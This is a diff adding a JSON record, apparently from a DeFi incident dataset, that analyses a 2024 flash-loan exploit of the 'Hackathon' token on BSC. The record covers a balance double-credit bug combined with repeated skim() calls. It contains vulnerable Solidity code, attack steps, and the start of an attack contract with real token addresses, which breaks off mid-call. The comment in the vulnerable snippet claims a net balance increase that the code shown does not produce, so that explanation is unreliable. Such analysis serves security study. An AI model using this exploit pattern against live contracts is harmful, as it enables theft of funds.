@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-04-XX_Hackathon_BalanceDuplicationSkim",
+ "source_file": "2024/2024-04-XX_Hackathon_BalanceDuplicationSkim.md",
+ "title": "Hackathon — Same-Address Transfer Balance Double-Credit + Repeated skim Drain Analysis",
+ "date": "2024-04-01",
+ "protocol": "Hackathon",
+ "chain": "BSC",
+ "loss_raw": "~$20,000",
+ "loss_usd": 20000.0,
+ "root_cause": "Hackathon token `transfer()` logic double-credits balances when `sender == recipient == pair`, and repeatedly calling `skim()` infinitely drains the excess over reserves",
+ "attack_tx": null,
+ "vulnerable_contract": "Hackathon 0x11cee747",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: double-credit balance when sender == recipient\ncontract HackathonToken {\n    mapping(address => uint256) private _balances;\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        address sender = msg.sender;\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;  // ← if sender == recipient: subtract then re-add = net increase\n        // However, tax mechanism + pair logic allows skim without _update()\n\n        // When transferring to pair, reserves are not updated → excess extractable via skim()\n        return true;\n    }\n}\n\n// pair.skim(): transfers (balance - reserve) to `to`\n// If Hackathon balance exceeds reserves, the difference can be extracted\n\n//",
+  "// File: Hackathon_decompiled.sol\ncontract Hackathon {\n    function transfer(address p0, uint256 p1) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: prevent sender == recipient + block skim\nfunction transfer(address recipient, uint256 amount) public returns (bool) {\n    require(recipient != msg.sender, \"self-transfer not allowed\");\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] DODO DPP Flash Loan: 200,000 BUSD",
+  "→ [2] Swap BUSD → Hackathon (PancakeRouter)",
+  "→ [3] Transfer Hackathon tokens to pair contract",
+  "→ [4] pair.skim(attacker) × 10 iterations",
+  "→ [5] Swap Hackathon → BUSD × 10 iterations",
+  "→ [6] Repay DODO flash loan",
+  "→ [7] ~$20K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] DODO DPP Flash Loan: 200,000 BUSD\n  │\n  ├─→ [2] Swap BUSD → Hackathon (PancakeRouter)\n  │\n  ├─→ [3] Transfer Hackathon tokens to pair contract\n  │         └─ Creates state where pair real balance > pair reserves\n  │\n  ├─→ [4] pair.skim(attacker) × 10 iterations\n  │         └─ Each iteration receives (balance - reserve) in Hackathon\n  │\n  ├─→ [5] Swap Hackathon → BUSD × 10 iterations\n  │\n  ├─→ [6] Repay DODO flash loan\n  │\n  └─→ [7] ~$20K profit",
+  "interface IDPPOracle {\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;\n}\n\ninterface IPancakePair {\n    function skim(address to) external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract AttackContract {\n    IDPPOracle  constant dpp  = IDPPOracle(/* DODO DPP */);\n    IPancakePair constant pair = IPancakePair(/* BUSD-Hackathon pair */);\n    IERC20 constant BUSD       = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 constant HACK       = IERC20(0x11cee747Faaf0C0801075253ac28aB503C888888);\n\n    function testExploit() external {\n        dpp.flashLoan(0, 200_000e18, address(this), a"
+ ]
+}
